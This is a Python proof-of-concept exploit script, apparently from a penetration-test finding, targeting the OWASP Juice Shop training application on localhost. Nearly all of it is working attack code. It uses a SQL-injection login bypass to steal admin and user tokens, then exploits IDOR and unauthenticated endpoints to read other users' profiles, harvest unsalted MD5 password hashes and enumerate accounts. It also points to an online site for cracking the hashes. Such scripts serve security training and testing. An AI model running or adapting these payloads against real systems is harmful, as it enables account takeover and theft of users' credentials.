"""
F-004: Broken Access Control / IDOR - OWASP Juice Shop
=======================================================
PoC demonstrating four access control vulnerabilities:
  F-004-A: IDOR GET /api/Users/{id} (any authenticated user reads any user)
  F-004-B: Unauthenticated /rest/memories exposes MD5 password hashes
  F-004-C: /rest/user/authentication-details/ accessible by regular users
  F-004-D: /api/Challenges/ exposed without authentication

Usage: python3 poc.py
Target: http://localhost:3000
"""

import json
import sys
import urllib.request
import urllib.error

TARGET = "http://localhost:3000"


def http_get(url, token=None):
    req = urllib.request.Request(url)
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, {}


def http_post_json(url, data):
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {}


def get_token_via_sqli(offset=0):
    """Obtain JWT token via SQL injection bypass."""
    payload = {"email": f"' OR 1=1 LIMIT 1 OFFSET {offset}--", "password": "x"}
    status, body = http_post_json(f"{TARGET}/rest/user/login", payload)
    if status == 200 and "authentication" in body:
        auth = body["authentication"]
        return auth["token"], auth.get("bid")
    return None, None


def exploit_f004a(user_token, victim_id=1):
    """
    F-004-A: IDOR - authenticated user reads another user's profile.
    bender (id=3, role=customer) reads admin (id=1, role=admin).
    """
    print("\n[F-004-A] IDOR: GET /api/Users/{id} as regular user")
    print(f"  Requesting /api/Users/{victim_id} with user token (bender, id=3)...")
    status, body = http_get(f"{TARGET}/api/Users/{victim_id}", token=user_token)
    data = body.get("data", {})
    if status == 200 and data:
        print(f"  [VULNERABLE] HTTP {status}")
        print(f"  Victim id:    {data.get('id')}")
        print(f"  Victim email: {data.get('email')}")
        print(f"  Victim role:  {data.get('role')}")
        return True, data
    else:
        print(f"  [BLOCKED] HTTP {status}")
        return False, {}


def exploit_f004b():
    """
    F-004-B: Unauthenticated /rest/memories returns User objects
    with MD5 password hashes.
    """
    print("\n[F-004-B] Unauthenticated /rest/memories - Password Hash Leak")
    print("  Requesting /rest/memories (no auth)...")
    status, body = http_get(f"{TARGET}/rest/memories")
    memories = body.get("data", [])
    if status == 200 and memories:
        hashes_found = []
        for m in memories:
            user = m.get("User", {})
            pw_hash = user.get("password", "")
            email = user.get("email", "unknown")
            role = user.get("role", "")
            deluxe_token = user.get("deluxeToken", "")
            if pw_hash and pw_hash != "":
                hashes_found.append({
                    "email": email,
                    "password_hash": pw_hash,
                    "role": role,
                    "deluxeToken": deluxe_token[:20] + "..." if deluxe_token else ""
                })
        print(f"  [VULNERABLE] HTTP {status} - {len(memories)} memories, {len(hashes_found)} password hashes leaked")
        for h in hashes_found[:3]:
            print(f"  email={h['email']} hash={h['password_hash']} role={h['role']}")
        return True, hashes_found
    else:
        print(f"  [BLOCKED] HTTP {status}")
        return False, []


def exploit_f004c(user_token):
    """
    F-004-C: Regular user accesses /rest/user/authentication-details/
    which should be admin-only.
    """
    print("\n[F-004-C] Broken Access Control: /rest/user/authentication-details/")
    print("  Requesting as regular user (bender, role=customer)...")
    status, body = http_get(f"{TARGET}/rest/user/authentication-details/", token=user_token)
    users = body.get("data", [])
    if status == 200 and users:
        print(f"  [VULNERABLE] HTTP {status} - {len(users)} users returned to regular user")
        for u in users[:5]:
            print(f"  id={u.get('id')} email={u.get('email')} role={u.get('role')}")
        if len(users) > 5:
            print(f"  ... and {len(users) - 5} more users")
        return True, users
    else:
        print(f"  [BLOCKED] HTTP {status}")
        return False, []


def exploit_f004d():
    """
    F-004-D: Unauthenticated /api/Challenges/ exposes all application
    vulnerabilities, categories, and difficulty levels.
    """
    print("\n[F-004-D] Information Disclosure: /api/Challenges/ (no auth)")
    status, body = http_get(f"{TARGET}/api/Challenges/")
    challenges = body.get("data", [])
    if status == 200 and challenges:
        print(f"  [VULNERABLE] HTTP {status} - {len(challenges)} challenges exposed without auth")
        categories = {}
        for c in challenges:
            cat = c.get("category", "unknown")
            categories[cat] = categories.get(cat, 0) + 1
        print("  Categories exposed:")
        for cat, count in sorted(categories.items()):
            print(f"    {cat}: {count} challenges")
        return True, challenges
    else:
        print(f"  [BLOCKED] HTTP {status}")
        return False, []


def enumerate_users_idor(user_token, max_id=10):
    """Full user enumeration via IDOR on /api/Users/{id}."""
    print(f"\n[BONUS] IDOR User Enumeration (id 1-{max_id}):")
    found = []
    for uid in range(1, max_id + 1):
        status, body = http_get(f"{TARGET}/api/Users/{uid}", token=user_token)
        data = body.get("data", {})
        if status == 200 and data:
            found.append({"id": uid, "email": data.get("email"), "role": data.get("role")})
            print(f"  /api/Users/{uid} -> {data.get('email')} ({data.get('role')})")
    print(f"  Total users enumerated: {len(found)}")
    return found


def main():
    print("=" * 60)
    print("F-004: Broken Access Control / IDOR - OWASP Juice Shop")
    print(f"Target: {TARGET}")
    print("=" * 60)

    # Phase 1: Obtain tokens via SQLi
    print("\n[PHASE 1] Obtaining tokens via SQL injection bypass")
    admin_token, _ = get_token_via_sqli(offset=0)
    user_token, _ = get_token_via_sqli(offset=2)  # bender@juice-sh.op

    if not admin_token or not user_token:
        print("[ERROR] Failed to obtain tokens. Exiting.")
        sys.exit(1)

    print(f"  Admin token (id=1): {admin_token[:40]}...")
    print(f"  User token  (id=3): {user_token[:40]}...")

    results = {}

    # Phase 2: Exploit each finding
    results["F-004-A"], _ = exploit_f004a(user_token, victim_id=1)
    results["F-004-B"], hashes = exploit_f004b()
    results["F-004-C"], _ = exploit_f004c(user_token)
    results["F-004-D"], _ = exploit_f004d()

    # Phase 3: Bonus - full enumeration
    enumerate_users_idor(user_token, max_id=10)

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for finding, vuln in results.items():
        status_str = "VULNERABLE" if vuln else "NOT VULNERABLE"
        print(f"  {finding}: {status_str}")

    if hashes:
        print(f"\nPassword hashes leaked (sample, MD5 - no salt):")
        for h in hashes[:2]:
            print(f"  {h['email']}: {h['password_hash']}")
        print("  -> Crack at: https://crackstation.net/ (offline, do not submit to external sites in real engagements)")

    vulnerable_count = sum(1 for v in results.values() if v)
    print(f"\n{vulnerable_count}/4 sub-findings confirmed VULNERABLE")
    print("Severity: CRITICAL (CVSS 9.1)")

    return 0 if vulnerable_count > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
